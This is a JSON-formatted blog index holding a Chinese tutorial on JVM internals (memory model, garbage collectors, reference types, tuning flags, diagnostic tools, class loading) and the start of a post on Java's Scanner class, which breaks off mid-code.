[{"title":"JVM底层原理","url":"/2023/05/03/JVM%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/","content":"JVM结构规范和执行流程JVM的结构及其作用JVM 主要由以下部分组成：类加载器、运行时数据区、执行引擎和本地方法接口\n\n类加载器：类加载器负责将类文件（.class 文件）加载到 JVM 中，并生成对应的 Class 对象，并根据需要进行验证、zhun’b初始化。类加载器按照类文件的位置、来源和访问权限等进行分类，通常分为三种类型：引导类加载器、扩展类加载器和应用程序类加载器。\n\n运行时数据区：运行时数据区即 JVM 内存，存储JVM在运行过程中产生的数据，它由多个不同的数据区域组成，包括方法区、堆、虚拟机栈、本地方法栈和程序计数器等。\n每个线程都有自己的虚拟机栈和本地方法栈，用于存储方法的参数、局部变量和返回值等信息。堆用于存储对象实例，方法区用于存储类信息、常量、静态变量和编译器生成的代码等。虚拟机栈用于管理Java方法的调用。而本地方法栈则用于管理native方法（例如Thread.start()）的调用\n\n执行引擎：Execution Engine 是 JVM 的核心组件，它负责执行在 JVM 中加载的字节码指令。它包括解释器和即时编译器两种执行方式。此外还包含垃圾回收器，用于内存管理，可以自动释放不再使用的内存空间\n\n本地方法接口：Native Method Interface 允许 Java 程序与底层的本地系统交互，例如调用 C&#x2F;C++ 等语言编写的库\n\n\nHotSpot JVM内存模型HotSpot JVM的JVM结构（可以划分为三类）：\n线程私有区域\n\nJava虚拟机栈\n“栈内存”通常指的就是这里的Java虚拟机栈\n线程内存模型（栈帧）：存储了局部变量表、操作数栈、动态链接、方法出口等信息\n\n局部变量表存储的信息\n基本数据类型：局部变量表存储了基本数据类型的值，包括 int、long、float、double、byte、short 和 char。\n对象引用：局部变量表还存储了对象引用，即指向对象实例在Java堆中的指针。对于类实例和数组，这些引用通常是指向堆内存中的对象实例的指针。\nreturnAddress类型：returnAddress类型用于存储字节码指令的地址。当Java虚拟机执行到一个方法调用指令时，它会将下一条要执行的指令的地址保存到局部变量表。当方法执行完毕后，Java虚拟机通过局部变量表中保存的returnAddress返回到调用者的代码中继续执行。\n\n\n局部变量表的容量以局部变量槽（Local Variable Slot）为单位进行度量。一个局部变量槽可以存储一个32位的数据类型（如int、float、reference和returnAddress），而64位的数据类型（如long和double）则需要两个连续的局部变量槽来存储。\n\n处理动态链接方法的返回值和异常处理分派\n记录了方法的执行过程\n\n本地方法栈\n本地方法栈和Java虚拟机栈唯一的不同是，本地方法栈存储的是Native方法的数据，Java虚拟机栈存储的是Java方法的数据\n\n程序计数器\n如果该线程执行的是Native方法，则程序计数器的值为空\n\n\n线程共享区域：\n\nJava堆\nJVM运行过程中创建的对象几乎都会被存储在堆中。\n是垃圾收集器管理的内存区域，又称“GC堆”。由于JVM采用分代回收算法，Java 堆从GC（Garbage Collection）的角度还可以细分为新生代（Eden、SurvivorTo、SurvivorFrom）、老年代\n\n方法区（元空间）\n常量、静态变量、即时编译器编译后的代码、类型信息缓存等数据\n\n\n直接内存\n又称“堆外内存”，NIO（New Input&#x2F;Output）类引入了一种基于通道（Channel）和缓冲区（Buffer）的I&#x2F;O方式，可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的DirectByteBuffer对象作为这块内存的引用进行操作，避免在Java堆和Native堆中来回复制数据。\nJVM执行Java程序的流程运行一个Java程序时，JVM执行以下步骤：\n\n编译：首先，Java源代码（.java文件）需要被编译成字节码（.class文件）。编译过程由Java编译器（javac）完成。编译器会将Java源代码转换成与平台无关的字节码文件。\n\n类加载阶段\n\n加载：在程序运行时，JVM负责加载字节码文件。这一过程由类加载器（ClassLoader）负责。类加载器首先查找并加载类文件，然后将字节码转换为JVM内部的数据结构。\n\n验证：字节码文件加载后，JVM会对其进行验证，确保代码是安全和符合规范的。验证过程包括检查字节码的结构、数据类型、操作数栈等。若字节码不符合规范，JVM将拒绝执行。\n\n准备：验证通过后，JVM为类中的静态变量分配内存并设置默认值。这一过程确保在初始化阶段为静态变量赋值时已有可用的内存。\n\n解析：JVM对类的符号引用进行解析，将它们替换为实际的内存地址。这包括将类、字段、方法等的引用转换为具体的内存地址或偏移量。\n\n初始化：在解析完成后，JVM执行类的初始化代码。这包括执行静态初始化块和为静态变量赋值。初始化阶段确保类在使用前已经被正确初始化。\n\n\n\n解释执行：JVM开始执行字节码。字节码由JVM的解释器逐条解释执行，或通过即时编译器（JIT）编译成本地代码后执行。JVM管理内存、线程、异常处理等，确保程序能够在一个独立的运行时环境中运行。\n\n垃圾回收：在程序运行过程中，JVM负责管理内存。当对象不再被引用时，垃圾回收器（Garbage Collector）会自动回收其占用的内存，确保内存的有效利用。\n\n结束：当程序执行完成或遇到异常时，JVM将执行结束操作。这包括释放内存、关闭资源、销毁线程等。最后，JVM退出并结束运行。\n\n\n垃圾回收理论判断一个对象是否存活的算法\n引用计数算法\n可达性分析算法\n\n分代回收理论分代收集理论建立在两个假说之上，分别是弱分代假说和强分代假说\n根据对象的生命周期将内存分为新生代和老年代两个部分。优先回收新生代中的对象，减少全局垃圾回收的次数，提高效率。  回收效率高，不容易产生内存碎片。缺点是需要对内存进行分代管理，增加了复杂性。\nApple式回收Apple式回收（基于分代收集理论和标记复制算法）：把新生代分为一块较大的Eden空间和两块较小的Survivor空间，每次分配内存只使用Eden和一块Survivor。发生垃圾收集时，将Eden和Survivor中仍然存活的对象一次性复制到另外一块Survivor空间上。然后直接清理掉Eden和已经使用过的那块Survivor。当存储存活对象的Survivor不足以容纳所有的存活对象，Apple式回收就使用其他内存区域（大多是老年代）进行分配担保。\n垃圾回收类型\n部分收集\n新生代收集（Minor GC）\n老年代收集（Major GC）\n\n\n整堆收集（Full GC）\n\n垃圾回收算法判断对象是否“存活”的方法有引用计数算法和可达性分析法。\n\n\n\n名称\n时间\n基本原理\n优点\n缺点\n适用场景\n\n\n\n标记-清除算法\n20世纪50年代\n标记所有活动对象，然后清除所有未标记的对象。 也可以反过来。 是最基础的垃圾收集算法，后续的回收算法大都是以标记-清除算法为基础，对其缺点进行改进得到的。\n简单易懂，可处理循环引用的情况。\n效率不稳定，容易产生内存碎片。\n由于，不需要内存移动，所以再内存回收时延迟低，关注延迟的CMS收集器则是基于标记-清除算法的，不过CMS收集器面临空间碎片过多时，会采用标记-整理算法清除一次。（用于老年代）\n\n\n标记-复制算法\n20世纪60年代\n将内存分成已使用（From）和空闲（To）区域。在垃圾回收时，将存活的对象从 From 区域复制到 To 区域，然后清空 From 区域。现在的商业虚拟机都采用这种收集算法来回收新生代。\n不容易产生内存碎片。\n浪费一半内存空间。如果多数对象都是存活的，就会产生大量内存间的复制开销\n由于，如果多数对象都是可回收的，需要复制的只是占少数的存活对象。所以适合新生代。现在的商用虚拟机大多优先采用这种算法回收新生代。（用于新生代）\n\n\n标记-整理算法\n20世纪60年代\n其标记过程仍然和标记-清除算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活对象向内存空间的一端移动，然后直接清理掉边界外的内存。\n不容易产生内存碎片。\n需要移动对象，可能会造成较长的停顿时间。\n由于，是否移动内存是优缺点并存的，移动则内存回收时会耗时，不移动则内存分配时会耗时。如果不移动内存，即使垃圾收集器的效率提高一些，则因为内存分配和访问比垃圾收集频率要高得多，这部分耗时增加，总的吞吐量仍然会下降。所以，关注吞吐量的Parallel Old是基于标记-整理算法的。（用于老年代）\n\n\nHotSpot垃圾回收算法实现细节根节点\n安全点\n并发可达性分析\n垃圾回收器Java 的垃圾回收器有多种实现方式，每种垃圾回收器都有其独特的特点和适用场景。\n垃圾收集器下的并行和并发\n并行：描述的是多条垃圾收集器线程之间的关系\n并发：描述的是垃圾收集器和用户线程之间的关系\n\n经典垃圾回收器这里讨论的经典垃圾收集器是JDK7 Update4之后，JDK11正式发布之前，OracleJDK和HotSpot虚拟机所包含的全部可用的垃圾收集器。\n新生代垃圾回收器所有的新生代的垃圾回收器都是复制算法\n\n\n\n收集器\n收集对象和算法\n收集器类型\n优点\n缺点\n描述\n\n\n\nSerial\n新生代，复制算法\n单线程\n所有收集器中内存消耗最小的\n用户线程停顿时间长\n单线程强调的是它在垃圾收集时，必须暂停其他所有工作线程，知道它收集完成。是HotSpot虚拟机运行在客户端模式下默认新生代收集器。适合处理器核心较少的环境。\n\n\nParNew\n新生代，复制算法\n并行的多线程收集器\n只有ParNew能和CMS配合使用。有自适应的调节策略\n\n实际上是Serial的多线程版本，除了同时使用多条线程进行垃圾收集外，其余都和Serial一样。默认开启和处理器核心数量相同的线程数，在目前服务器CPU往往达到32核核环境下，可以适用-XX:ParallelGCThreads参数来限制。\n\n\nParallel Scavenge\n新生代，复制算法\n并行的多线程收集器\n吞吐量高\n\nParallel Scavenge的特点是它的关注点和其它收集器不同，Parallel Scavenge关注点是吞吐量，所谓吞吐量就是处理器用于运行用户代码的时间和处理器总消耗时间的比值。其合适的搭配是Parallel Old\n\n\n老年代垃圾收集器老年代会有两种算法，标记整理算法 和 标记清除算法\n\n\n\n收集器\n收集对象和算法\n收集器类型\n优点\n缺点\n描述\n\n\n\nSerial Old\n老年代，标记整理算法\n单线程\n\n\n是Serial的老年代版本\n\n\nParallel Old\n老年代，标记整理算法\n并行的多线程收集器\n\n\n是Parallel Scavenge的老年代版本\n\n\nCMS\n老年代，标记清除算法\n并行与并发收集器\n是一种以获取最短用户线程停顿时间为目标的收集器，适合关注服务响应速度的场景\n内存碎片：标记清除的回收方法会导致内存碎片，影响大对象分配。 CPU资源消耗：并发执行需占用额外CPU资源，可能影响总体性能。 浮动垃圾：无法处理并发标记阶段产生的新垃圾，可能导致内存浪费。 预测性能不稳定：基于触发条件，设置不合理时可能导致停顿时间过长。 长时间Full GC：某些情况下，CMS无法回收足够空间，触发Full GC，导致停顿。 实现复杂：相对其他收集器，CMS实现复杂，维护困难，可能出现错误或性能问题。\n运作过程相对复杂，整个过程分为四步：初始标记、并发标记、重新标记、并发清除。\n\n\n全功能垃圾收集器\n\n\n收集器\n收集对象和算法\n收集器类型\n优点\n缺点\n描述\n\n\n\nG1\n跨新生代和老年代；化整为零\n并行与并发收集器\n回收的最小单元不再是固定大小的新生代和老年代，而是Region，进而采用具有优先级的区域回收方式，保证了G1收集器在有限的时间内获取尽可能高的收集效率。\n\n开创了面向局部收集的设计思路和基于Region的内存布局形式，不再以固定大小及固定数量的分代区域划分，而是把连续的Java堆划分为多个大小相等的独立区域（Region），每一杠Region根据需要，扮演新生代的Eden空间、Survior区间，或者老年代空间。并对不同角色的Region采用不同的策略去处理。Region中还有一类特殊的区域，Humongous，用来存储大对象。G1在大内存应用上表现好，CMS在小内存应用上表现优于G1。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器。\n\n\n低延迟垃圾回收器Shenandoah （ˌʃɛnənˈdoʊə）和ZGC两款垃圾收集器在几乎整个工作时间里都是并发的，而CMS和G1在回收新生代的垃圾时必须挂起用户线程。并且这两款垃圾收集器可以在任意可管理的堆容量下实现垃圾收集的停顿不超过十毫秒。\nShenandoah垃圾回收器是一款只有OpenJDK才会包含，而OracleJDK里不存在的收集器，Shenandoah和G1有着相似的堆内存布局，是基于G1开发的，并对G1的一些不足进行了改进\nZGC是一款基于Region内存布局的，使用了读屏障、染色体指针和内存多重映射等技术来实现可并发的标记-整理算法，以低延迟为首要目标的垃圾收集器\n不进行垃圾回收的垃圾收集器Epsilon 垃圾回收器是一款以不进行垃圾回收的垃圾回收器，只复责分配和释放内存空间、与解释器协作、与编译器协作等简单的内存管理任务。\n在实际生产环境中是有用武之地的，比如以下两种情景：\n\n如果应用只需要运行数分钟或数秒，只要Java虚拟机能正确的分配内存，在堆耗尽之前就会退出，那显然没有任何回收行为的Epsilon就很合适。\n需要剥离垃圾回收器影响的性能测试和压力测试\n\nJava引用类型和垃圾回收的关系在Java中，引用类型可以分为四种：强引用、软引用、弱引用和虚引用。它们主要在对象的生命周期和垃圾回收方面有所区别。\n\n强引用（Strong Reference）：当一个对象被强引用指向时，它不会被垃圾回收器回收。只有当强引用不再指向该对象时，该对象才有可能被回收。\n\nObject obj = new Object();\n\n\n软引用（Soft Reference）：当一个对象只被软引用指向时，它在内存不足时会被垃圾回收器回收。软引用主要用于实现缓存功能。\n\nimport java.lang.ref.SoftReference;Object obj = new Object(); // obj 是一个强引用SoftReference&lt;Object&gt; softReference = new SoftReference&lt;&gt;(obj); // softReference 是一个软引用\n\n\n弱引用（Weak Reference）： 当一个对象只被弱引用指向时，可以被垃圾回收器回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构，如ThreadLocal的实现就使用了弱引用。若是强引用，即使tl&#x3D;null ，但key的引用依然指向ThreadLocal对象，所以会有内存泄漏，而使用弱引用则不会。具体来说，ThreadLocal由一个名为ThreadLocal.ThreadLocalMap的内部类来保存。在ThreadLocalMap中，set到ThreadLocal对象的值作为值（value），ThreadLocal对象作为键（key），并且key是一个弱引用。这意味着，如果ThreadLocal对象没有其他强引用存在，那么这个ThreadLocal对象就可能在下一次垃圾回收时被回收。但还是有内存泄漏存在，ThreadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏，所以还是需要remve()这个key。\n\nimport java.lang.ref.WeakReference;Object obj = new Object();WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj);\n\n\n虚引用（Phantom Reference）：当一个对象只被虚引用指向时，它只是用于跟踪对象是否被回收，可以被垃圾回收器回收。主要用于管理堆外内存，通常和ReferenceQueue结合使用，当DirectByteBuffer对象被回收时，就向ReferenceQueue对象中添加数据，垃圾回收器可以通过检测ReferenceQueue对象得到到这一变化，然后清理堆外内存。和弱引用的区别是弱引用中的对象可以被弱引用变量get到，但是虚引用引用的变量不能被get到。\n\nimport java.lang.ref.PhantomReference;import java.lang.ref.ReferenceQueue;Object obj = new Object();ReferenceQueue&lt;Object&gt; referenceQueue = new ReferenceQueue&lt;&gt;();PhantomReference&lt;Object&gt; phantomReference = new PhantomReference&lt;&gt;(obj, referenceQueue);\n\nJVM的参数配置JVM的参数\n\n\n参数名\n描述\n使用示例\n\n\n\n-Xmx\n设置JVM最大可用内存\njava -Xmx2g MyApp 将最大可用内存设置为2GB\n\n\n-Xms\n设置JVM最小可用内存\njava -Xms512m MyApp 将最小可用内存设置为512MB\n\n\n-XX:MaxDirectMemorySize\n设置JVM可以使用的最大堆外内存大小，其默认值等于JVM的最大堆大小（即-Xmx的值）\njava -XX:MaxDirectMemorySize=1g -jar MyApp设置JVM的最大堆外内存大小为1GB\n\n\n-Xmn\n指定了 JVM 中新生代的最大可用空间，它的默认值是整个堆空间的1&#x2F;4，即 -Xmx 的1&#x2F;4。当新生代的大小达到了 -Xmn 指定的大小后，如果新生代中仍然有存活的对象，它们将被晋升到老年代。\njava -Xmn256m MyApp 将新生代大小设置为256MB，\n\n\n-XX:NewSize\n设置新生代初始大小\njava -XX:NewSize=256m Main将新生代的大小设置为256MB\n\n\n-XX:PermSize\n设置老年代初始大小\njava -XX:PermSize=128m MyApp 将永久代初始大小设置为128MB\n\n\n-XX:MaxPermSize\n设置老年代最大大小\njava -XX:MaxPermSize=256m MyApp 将永久代最大大小设置为256MB\n\n\n-XX:NewRatio\n设置新生代和老年代的比例\njava -XX:NewRatio=2 MyApp 将新生代和老年代的比例设置为1:2\n\n\n-XX:SurvivorRatio\n设置新生代中eden区和survivor区的比例\njava -XX:SurvivorRatio=8 MyApp 将eden区和survivor区的比例设置为8:1\n\n\n-XX:MetaspaceSize\n设置元空间大小\njava -XX:MetaspaceSize=256m MyApp 将元空间大小设置为256MB\n\n\n-XX:+UseG1GC\n启用G1垃圾回收器\njava -XX:+UseG1GC MyApp 启用G1垃圾回收器\n\n\n-XX:+UseConcMarkSweepGC\n启用CMS垃圾回收器\njava -XX:+UseConcMarkSweepGC MyApp 启用CMS垃圾回收器\n\n\n-XX:+HeapDumpOnOutOfMemoryError\n当发生OOM异常时，自动生成堆转储文件（heap dump），以便在之后进行分析\njava -XX:+HeapDumpOnOutOfMemoryError当发生OOM异常时打印日志\n\n\n-XX:HeapDumpPath&#x3D;path\n指定生成堆转储文件的路径\n-XX:HeapDumpPath=path=dump.log指定OOM日志存储信息\n\n\n-XX:+PrintGC\n输出GC（垃圾回收）日志\n-XX:+PrintGC\n\n\n-XX:+PrintGCDetails\n输出GC详细信息\n-XX:+PrintGCDetails\n\n\n-XX:+PrintHeapAtGC\n在每次GC后打印堆的详细信息\n-XX:+PrintHeapAtGC\n\n\nJVM参数设置示例8G内存服务器上运行了start.jar和Netty，JVM参数设置示例如下\n其中2GB留给操作系统，其余6GB分配给应用程序\njava -server #JVM运行在服务器模式下-XX:MaxDirectMemorySize #直接内存大小为2GB（Netty服务在运行时会使用直接内存，需要保证既有足够的直接内存满足Netty服务高效运行，又要在和虚拟机内存大小直接取得平衡）-Xmx3g -Xms3g #Java堆的大小为3GB--XX:NewSize #新生代占用堆1GB-XX:MetaspaceSize=128m #元空间的大小为128MB-XX:+UseG1GC #启用G1垃圾回收器-XX:+HeapDumpOnOutOfMemoryError #发生OOM时打印日志-XX:HeapDumpPath=path=dump.log #指定OOM日志存储信息-XX:+PrintGCDetails #输出GC详细信息-XX:+PrintHeapAtGC #每次GC后打印堆的详细信息\n\n参数的含义如下：\n\n-server：JVM运行在服务器模式下，以优化长时间运行的性能。\n-Xmx6g：设置JVM的最大堆大小为6GB。这个值可以根据应用程序的需要进行调整。\n-Xms6g：设置JVM的初始堆大小为6GB。这个值应该与 -Xmx 相同，以避免堆大小的动态调整。\n-Xmn3g：设置JVM的新生代大小为3GB，这个值可以根据应用程序的内存需求和垃圾收集策略来进行调整。\n-XX:MetaspaceSize=512m：设置JVM的元数据空间的初始大小为512MB。\n-XX:MaxMetaspaceSize=512m：设置JVM的元数据空间的最大大小为512MB，这个值可以根据应用程序的需要进行调整。\n-XX:+UseG1GC：使用 G1 垃圾收集器。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器，它以可预测的停顿时间和高效的内存回收著称。\n\n这些参数的设置应该根据具体的应用程序和系统配置进行调整，以获得最佳性能和稳定性。另外，可以使用一些诊断工具，如 jstat 和 jmap 等来监测 JVM 的运行状态和内存使用情况，以帮助优化 JVM 的性能和稳定性\nJVM性能分析工具（调优工具）常用的工具有jps、jinfo、jstat、jstack、jmap等，这些工具包含在JDK（Java Development Kit）的bin目录中，因此需要安装JDK才能使用\njps用于查看正在运行的Java进程及其相关信息（进程id、虚拟机参数如端口号和可用内存大小、jar包名称）\njps的基本语法如下：\njps [options] [hostid]\n\noptions表示可选的参数，hostid表示远程主机的ID，如果不指定则默认为本地主机。以下是一些常用的jps选项：\n\n-l：显示完整的包名和主类名。\n-m：显示传递给Java进程的参数。\n-v：显示传递给JVM的参数。\n-q：仅显示Java进程的ID，不显示类名、JAR名称和传递给Java进程的参数。\n\njinfojinfo（Java Configuration Info Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的配置信息，如系统属性和JVM参数\njinfo的基本语法如下：\njinfo [option] pid\n\n\noption：表示可选的参数，如获取系统属性、JVM参数等。\npid：表示要获取配置信息的Java虚拟机进程的ID。\n\n以下是一些常用的jinfo选项：\n\n-flag：显示或修改指定的JVM参数。\n-sysprops：显示Java系统属性。\n-flags：显示JVM参数。\n\n举个例子，要获取一个Java进程（假设其进程ID为12345）的Java系统属性，可以运行以下命令：\njinfo -sysprops 12345\n\n这个命令会输出Java进程的所有Java系统属性，如java.version、java.vendor、java.home等。您可以根据这些信息了解Java进程的运行环境和配置。\n另一个例子，要查看一个Java进程（假设其进程ID为12345）的JVM参数，可以运行以下命令：\njinfo -flags 12345\n\n这个命令会输出Java进程的所有JVM参数，如-Xmx、-Xms、-XX:+UseParallelGC等。您可以根据这些信息了解和优化Java进程的JVM配置。\njstat用于监控JVM内存使用情况和垃圾回收情况\njstat的基本语法如下：\njstat [option] [vmid] [interval] [count]\n\n\noption：表示要收集的统计信息类型，如垃圾回收、类加载等。\nvmid：表示要监控的Java虚拟机进程的ID。\ninterval：表示数据收集的时间间隔（以毫秒为单位），可选参数。\ncount：表示要收集的数据点数目，可选参数。\n\n以下是一些常用的jstat选项：\n\n-class：显示关于类加载器的统计信息。\n-compiler：显示关于即时编译的统计信息。\n-gc：显示关于垃圾回收的统计信息。\n-gccapacity：显示关于垃圾回收的各个内存区域的容量。\n-gcutil：显示关于垃圾回收的各个内存区域的使用情况。\n-gcnew：显示关于新生代垃圾回收的统计信息。\n-gcold：显示关于老年代垃圾回收的统计信息。\n\n举个例子，要收集一个Java进程（假设其进程ID为12345）的垃圾回收统计信息，每隔1000毫秒收集一次，总共收集10次，可以运行以下命令：\njstat -gc 12345 1000 10\n\n这个命令会输出一系列关于垃圾回收的统计信息，如内存区域的大小、已使用空间、垃圾回收次数等。\njstack用于生成虚拟机当前时刻的线程快照，目的通常是定位线程出现长时间停顿的原因。对于诊断Java应用程序的线程问题、锁竞争和死锁等问题非常有用。\njstack的基本语法如下：\njstack [option] pid\n\n\noption：表示可选的参数，如打印锁信息等。\npid：表示要获取堆栈跟踪信息的Java虚拟机进程的ID。\n\n以下是一些常用的jstack选项：\n\n-l：显示关于锁的附加信息，如已拥有的锁、等待的锁等。\n-m：显示关于本地方法的堆栈跟踪信息（仅适用于部分平台）。\n-F：强制执行堆栈跟踪，当正常执行失败时使用（仅适用于部分平台）。\n\n举个例子，要获取一个Java进程（假设其进程ID为12345）的线程堆栈跟踪信息，可以运行以下命令：\njstack 12345\n\n这个命令会输出Java进程的所有线程的堆栈跟踪信息，包括线程ID、线程状态、调用栈等。您可以根据这些信息诊断和解决应用程序中的线程问题。\njmapjmap（Java Memory Map Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的内存映射信息。它可以帮助您分析Java堆（heap）、永久代（PermGen，仅JDK 7及更早版本）或元空间（Metaspace，JDK 8及更高版本）的使用情况，从而诊断和解决内存泄漏、内存溢出等问题\njmap的基本语法如下：\njmap [option] pid\n\n\noption：表示要执行的操作，如获取堆信息、生成堆转储文件等。\npid：表示要获取内存映射信息的Java虚拟机进程的ID。\n\n以下是一些常用的jmap选项：\n\n-dump：生成堆转储文件（heap dump），可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析。\n-histo：显示堆中对象的实例数量、内存占用和类名等信息的直方图。\n-heap：显示堆的摘要信息，如使用的垃圾回收器、内存区域的大小和使用情况等。\n-permstat：显示永久代（PermGen）的类加载器、内存占用和类名等信息的统计信息（仅适用于JDK 7及更早版本）。\n-clstats：显示类加载器和系统类的统计信息。\n-finalizerinfo：显示在队列中等待执行的终结器方法的对象的信息。\n\n举个例子，要为一个Java进程（假设其进程ID为12345）生成堆转储文件，并将其保存到当前目录下的heapdump.hprof文件中，可以运行以下命令：\njmap -dump:format=b,file=heapdump.hprof 12345\n\n这个命令会生成一个堆转储文件，其中包含了Java进程的内存使用情况。您可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析，以诊断和解决内存相关问题。\n类加载机制类加载阶段Java虚拟机（JVM）的类加载机制是Java程序运行时将.class文件加载到内存的过程。类加载主要分为五个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）和初始化（Initialization）。\n\n加载（Loading）: 在这个阶段，JVM将从文件系统或网络中查找指定的.class文件，然后将其二进制数据加载到内存中，创建一个Class对象来表示这个类。类加载器主要有三个：引导类加载器（Bootstrap ClassLoader）、扩展类加载器（Extension ClassLoader）和应用类加载器（Application ClassLoader）。\n\n验证（Verification）: JVM会对已加载的二进制数据进行校验，确保其符合Java语言规范和JVM规范。这个过程包括：文件格式验证、元数据验证、字节码验证和符号引用验证。验证阶段的目的是确保加载的类文件不会对JVM产生不良影响。\n\n准备（Preparation）: 在这个阶段，JVM会为类的静态变量分配内存，并赋予默认值。注意这里的默认值不是程序员在代码中指定的初始值，而是基本类型的零值或引用类型的null值。\n而对于final类型的静态变量，如果它们在编译时可以确定值（即编译时常量），JVM会在准备阶段直接为它们分配内存并赋予程序员在代码中指定的初始值。这是因为final变量的值在程序运行期间是不可变的，所以可以提前赋值。然而，如果一个final类型的静态变量不能在编译时确定值（例如，它的值是通过方法调用得到的），那么这个变量在准备阶段仍然会被赋予默认值，然后在初始化阶段由程序员指定的值替换。\n\n解析（Resolution）: 解析阶段主要是将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。\n在Java程序中，类、接口、字段和方法等元素在源代码中的表示形式通常是符号引用（Symbolic Reference）。符号引用是一种依赖于符号（如类名、方法名和字段名等）的引用形式。然而，为了在运行时更高效地访问这些元素，JVM需要将这些符号引用替换为直接引用（Direct Reference）。\n直接引用是一种可以直接指向内存地址或者间接指向内存地址的引用。在JVM中，直接引用可以是指向方法区（Method Area）中类和接口数据结构的指针、指向实例变量和类变量的内存地址的偏移量，或者是指向常量池中某个常量的索引。\n符号引用和直接引用的区别在于，符号引用需要在运行时通过查找和解析得到实际的内存地址，而直接引用已经包含了实际的内存地址信息，可以直接访问目标元素。因此，使用直接引用可以提高程序运行时的访问速度。\n在类加载的解析阶段，JVM负责将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。需要注意的是，并非所有的符号引用都会在解析阶段被替换为直接引用，有些符号引用会在程序运行时进行动态解析。这通常发生在反射和动态代理等场景下。\n\n初始化（Initialization）: 在这个阶段，JVM会根据程序员在代码中指定的初始值，为类的静态变量赋予正确的值。此外，如果类有静态代码块，JVM会执行这些代码块。初始化阶段是类加载过程中的最后一个阶段。\n\n\n父子类加载和初始化顺序关系在JVM类加载阶段，父子类关系表现在加载和初始化过程。加载子类时，所有父类被加载。初始化时，父类先于子类初始化，确保子类使用父类静态字段和方法时，父类已初始化。\n类加载器和双亲委派模型JVM类加载器（Class Loader）负责将.class文件加载到内存，主要有四种：\n\n引导类加载器（Bootstrap ClassLoader）：负责加载位于%Java_HOME%&#x2F;lib下的Java核心类库，如java.util等\n扩展类加载器（Extension ClassLoader）：负责加载位于%Java_HOME%&#x2F;jre&#x2F;lib&#x2F;ext目录下Java扩展库，或通过java.ext.dirs系统变量加载指定路径下的类库\n应用类加载器（Application ClassLoader）：负责加载用户程序的类路径（classpath）下的类\n自定义类加载器（User ClassLoader）：通过继承java.lang.ClassLoader类并重写 findClass 方法实现\n\n类加载器采用双亲委派模型（Parent-Delegation Model）。当加载类时，先请求父加载器加载；父加载器无法加载时，当前加载器尝试加载。这保证了Java核心类库安全与一致性，避免应用程序覆盖核心类库。\nOSGIOSGI（Open Service Gateway Initiative）是一个用于实现模块化和动态组件系统的开放标准框架。它允许在一个Java虚拟机（JVM）实例中创建和管理多个模块化组件，这些组件被称为“bundles”。OSGI提供了一种将Java应用程序分解为更小、更易于管理和维护的模块的方法，从而提高了开发人员的生产力和代码的可重用性。\nOSGI的主要特点如下：\n\n模块化：OSGI框架支持将Java应用程序划分为多个模块，每个模块都可以独立开发、部署和更新，从而降低了开发复杂性和维护成本。\n\n动态：OSGI支持动态加载、卸载和更新模块，这意味着在不重启整个应用程序的情况下，可以热部署模块，提高了系统的灵活性和可扩展性。\n\n服务注册和发现：OSGI提供了一个服务注册表，允许模块之间通过服务接口进行通信，而不是直接依赖于其他模块的具体实现。这有助于降低模块间的耦合度，提高代码的可维护性和可重用性。\n\n版本管理：OSGI允许同一个JVM中存在不同版本的模块，这样可以在升级或修复某个模块时避免对其他模块产生影响。\n\n\nOSGI已被广泛应用于各种Java项目中，例如Eclipse IDE（集成开发环境）就是基于OSGI构建的\nOSGI不遵循双亲委派模型，在安全上有所牺牲\nReferences\n周志明. 深入理解Java虚拟机:第三版. 北京: 机械工业出版社, 2019.11.\n\n","categories":["IT"],"tags":["JVM"]},{"title":"Java基础","url":"/2023/05/02/Java%E5%9F%BA%E7%A1%80/","content":"JAVA中Scanner的使用及nextLine和nextInt等混用报错问题解决\n参考出处：https://blog.csdn.net/qq_38367575/article/details/120420633\n\nScanner类用于扫描从控制台输入的数据，可以接收字符串和基本数据类型的数据。位于java.util.Scanner包中。\nScanner常用方法\nString  next(); \n作用：接收控制台输入的一个字符串。\n注意：以空格和回车为结束符 \n\nString  nextLine(); \n作用：接收控制台输入的一个字符串。 \n注意：以回车为结束符\n\nint  nextInt(); \n作用：接收控制台输入的一个int类型的数据。\n注意：以空格和回车为结束符 \n\ndouble  nextDouble(); \n作用：接收控制台输入的一个double类型的数据。\n注意：以空格和回车为结束符  \n\nboolean  nextBoolean(); \n作用：接收控制台输入的一个boolean类型的数据。\n注意：以空格和回车为结束符\n\n\n示例：\n//步骤1、创建Scanner类的一个对象。 Scanner scanner = new Scanner(System.in); \t //步骤2、通过scanner调用next等方法，接收控制台输入的数据。 System.out.println(“姓名：”);String name = scanner.next();\n\n常见问题\n\n原因分析：原因是nextDouble()、nextInt()等方法，能够读出空格或者回车前的字符串或者数字，并且下次读时不会切换到空格或者回车之后（也就是还在18之后继续读，不会切换到下一行）。而nextLine则会读取本行且下次自动切换到下一行开头读。\n解决方法在nextDouble()、nextInt()等方法后面都要加上一句不需要赋值的nextLine()，把读的位置切换到下一行\n示例：\nimport java.util.Scanner;public class Tess &#123;\tpublic static void main(String[] args) &#123;\t\tScanner scanner = new Scanner(System.in);\t\tint age = scanner.nextInt();\t\tscanner.nextLine();//把读的位置切换到下一行\t\tString name = scanner.nextLine();\t\tdouble salary = scanner.nextDouble();\t\tscanner.nextLine();//把读的位置切换到下一行\t\tSystem.out.println(&quot;age:&quot; + age);\t\tSystem.out.println(&quot;name:&quot; + name);\t\tSystem.out.println(&quot;salary:&quot; + 